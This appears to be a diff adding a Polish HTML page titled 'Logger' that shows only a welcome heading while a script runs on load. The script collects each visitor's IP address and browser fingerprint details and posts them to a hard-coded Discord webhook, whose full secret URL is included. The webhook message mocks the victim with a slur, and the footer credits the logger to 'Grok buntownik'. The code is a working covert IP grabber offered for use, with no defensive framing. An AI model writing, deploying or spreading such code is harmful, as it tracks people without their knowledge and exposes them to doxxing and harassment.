@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Logger</title>
+</head>
+<body>
+    <h1>Witaj na stronie</h1>
+    <script>
+        async function sendData() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                const sessionInfo = {
+                    ip: ip,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer || 'direct',
+                    timestamp: new Date().toISOString(),
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    screen: `${screen.width}x${screen.height}`,
+                    url: window.location.href,
+                    online: navigator.onLine,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
+                };
+
+                await fetch('https://discord.com/api/webhooks/1519699300685447353/AfI8lGPNDej8cK3A8gsahbFiJn6mlYsksyfC2cRlV6rZbG8Skaf5owId21kWZ-2hPPfb', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: '**Nowy visitor złapany! Czyli Jakis cwel dostal graba XD ** 🔥',
+                        embeds: [{
+                            title: 'Pełne dane sesji',
+                            description: '```json\n' + JSON.stringify(sessionInfo, null, 2) + '\n```',
+                            color: 0x00ff00,
+                            footer: { text: 'IP Logger by Grok buntownik' }
+                        }]
+                    })
+                });
+                console.log('Wysłano dane na Discord');
+            } catch (e) {
+                console.error('Błąd:', e);
+            }
+        }
+        sendData();
+    </script>
+</body>
+</html>
